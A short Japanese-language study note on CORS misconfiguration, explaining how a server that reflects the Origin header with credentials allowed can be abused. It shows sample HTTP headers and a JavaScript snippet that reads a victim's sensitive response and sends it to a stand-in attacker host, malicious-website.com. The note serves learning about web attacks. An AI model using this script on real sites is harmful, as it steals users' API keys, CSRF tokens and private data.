## 前提知識
### クロスオリジンリソース共有とは？
- 特定のドメインのリソースにアクセスさせるための機能。
- 同一ドメインポリシーの拡張機能的役割。

## 攻撃手法
### 1. **クライアントが指定したOriginヘッダーからサーバが生成したACAOヘッダー**
- リクエストからOriginヘッダーを読取り、レスポンスが許可されていることを示すレスポンスヘッダーを含める。
	↓リクエスト
	```
	GET /sensitive-victim-data HTTP/1.1
	Host: vulnerable-website.com
	Origin: https://malicious-website.com
	Cookie: sessionid=...
	```
	↓レスポンス
	```
	HTTP/1.1 200 OK
	Access-Control-Allow-Origin: https://malicious-website.com // ←アクセスが許可されたことを示す。
	Access-Control-Allow-Credentials: true // ←クッキーを含めることを許可している。
	...
	```

- 以下のスクリプトをWebサイトに配置することで、レスポンスに含まれるAPIキーだったり、CSRFトークンだったりが盗める。
```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};
```
